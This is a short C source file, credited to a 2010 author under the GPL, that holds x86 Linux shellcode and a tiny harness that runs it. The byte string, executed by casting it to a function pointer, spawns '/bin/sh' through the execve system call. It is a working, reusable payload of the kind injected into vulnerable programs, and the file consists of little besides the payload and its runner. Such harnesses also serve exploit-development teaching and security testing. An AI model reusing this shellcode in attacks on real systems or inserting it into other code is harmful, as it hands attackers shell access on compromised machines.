/*
 *      shellcode_x86.c
 *      
 *      Copyright 2010 Robin Nehls <nehls@mi.fu-berlin.de>
 *      
 *      This program is free software; you can redistribute it and/or modify
 *      it under the terms of the GNU General Public License as published by
 *      the Free Software Foundation; either version 2 of the License, or
 *      (at your option) any later version.
 *      
 *      This program is distributed in the hope that it will be useful,
 *      but WITHOUT ANY WARRANTY; without even the implied warranty of
 *      MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *      GNU General Public License for more details.
 */

#include <stdio.h>
#include <string.h>

char shellcode[] =
"\xb8\x30\x2f\x73\x68\xc1\xe8\x08\x50\x68\x2f\x62\x69\x6e\x89"
"\xe3\x31\xd2\x52\x53\x89\xe1\x31\xc0\xb0\x0b\xcd\x80";
void main() {
    int (*funct)();
    funct = (int (*)()) shellcode;
    printf("Shellcode lenght=%d\n",strlen(shellcode));
    (int)(*funct)();
}
